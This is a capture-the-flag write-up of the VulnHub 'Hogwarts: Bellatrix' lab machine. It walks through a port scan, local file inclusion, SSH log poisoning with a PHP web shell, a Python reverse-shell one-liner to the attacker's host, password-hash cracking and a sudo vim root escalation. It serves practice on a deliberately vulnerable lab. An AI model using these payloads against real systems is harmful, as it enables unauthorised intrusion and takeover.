---
title: Hogwarts-Bellatrix - Writeup
author: Elman Alizadeh
date: 2022-05-22 21:28:00 +0800
categories: [ctf, VulnHub]
tags: [vulnhub, hogwarts, bellatrix]
---

Today we will take a look at Vulnhub: Bellatrix. My goal in sharing this writeup is to show you the way if you are in trouble. Please try to understand each step and take notes.

![Desktop View]({{ "/assets/img/vuln-hogwarts-bellatrix/1.jpeg" | relative_url }})

## Network scan

Command: sudo nmap -p- -sV -sC -oN nmap/open — open 192.168.0.105

```console
Nmap scan report for 192.168.0.113
Host is up (0.032s latency).
Not shown: 61087 closed tcp ports (reset), 4446 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.3p1 Ubuntu 1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 4b:ce:c7:5a:9c:1f:8b:cd:47:03:08:69:85:c2:91:49 (RSA)
|   256 a1:2a:a8:15:99:04:cc:2a:1e:e3:50:00:f3:55:c2:cc (ECDSA)
|_  256 2c:d3:ec:6f:4f:5b:4a:e0:ea:0a:c3:0d:2f:cb:78:17 (ED25519)
80/tcp open  http    Apache httpd 2.4.46 ((Ubuntu))
|_http-title: AvadaKedavra
|_http-server-header: Apache/2.4.46 (Ubuntu)
MAC Address: 3C:A0:67:C5:35:33 (Liteon Technology)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## Web

![Desktop View]({{ "/assets/img/vuln-hogwarts-bellatrix/2.png" | relative_url }})

After seeing the .php extension, we go there.

http://192.168.0.113/ikilledsiriusblack.php


![Desktop View]({{ "/assets/img/vuln-hogwarts-bellatrix/3.png" | relative_url }})

There is such a thing in the source code below.

Yes, that’s what you think. Let’s check. ;)

http://192.168.0.113/ikilledsiriusblack.php?file=../../../../../../etc/passwd

![Desktop View]({{ "/assets/img/vuln-hogwarts-bellatrix/4.png" | relative_url }})

## Reverse

We need to get the reverse shell from here. If we investigate, we find.

[LFI_reverse](https://a3h1nt.medium.com/from-local-file-inclusion-to-reverse-shell-774fe61b7e1e)

Let’s check

http://192.168.0.113/ikilledsiriusblack.php?file=../../../../../../var/log/auth.log

Command: ssh ‘<?php system($_GET[“cmd”]); ?>’@192.168.0.113


![Desktop View]({{ "/assets/img/vuln-hogwarts-bellatrix/5.png" | relative_url }})

http://192.168.0.113/ikilledsiriusblack.php?file=../../../../../..//var/log/auth.log&cmd=ls%20-la

![Desktop View]({{ "/assets/img/vuln-hogwarts-bellatrix/6.png" | relative_url }})

Yes it works.

```console
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.0.107",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

After logging in

Command: script /dev/null -c bash

Command: export TERM=xterm

ctrl+z

Command: stty raw -echo ; fg

Command: reset

## Lestrange

As we look inside, we see a folder whose name is encrypted with base64. There are two files in it. One is the password list and the other is the hash form of the name and password.

![Desktop View]({{ "/assets/img/vuln-hogwarts-bellatrix/7.png" | relative_url }})

```console
Command: john hash --wordlist=pass.txt

Using default input encoding: UTF-8
Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 128/128 AVX 2x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
ihateharrypotter (lestrange)     
1g 0:00:00:00 DONE (2022-05-22 20:52) 2.380g/s 273.8p/s 273.8c/s 273.8C/s gryffondor
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```
Command: su lestrange

## Root

Command: sudo -l

```console
(ALL : ALL) NOPASSWD: /usr/bin/vim
```

[GTFO_vim](https://gtfobins.github.io/gtfobins/vim/#sudo)

Command: sudo /usr/bin/vim -c ‘:!/bin/sh’

![Desktop View]({{ "/assets/img/vuln-hogwarts-bellatrix/8.png" | relative_url }})

### And now we are the root

![Desktop View]({{ "/assets/img/vuln-hogwarts-bellatrix/9.gif" | relative_url }})

“If you have any questions or comments, please do not hesitate to write. Have a good days”
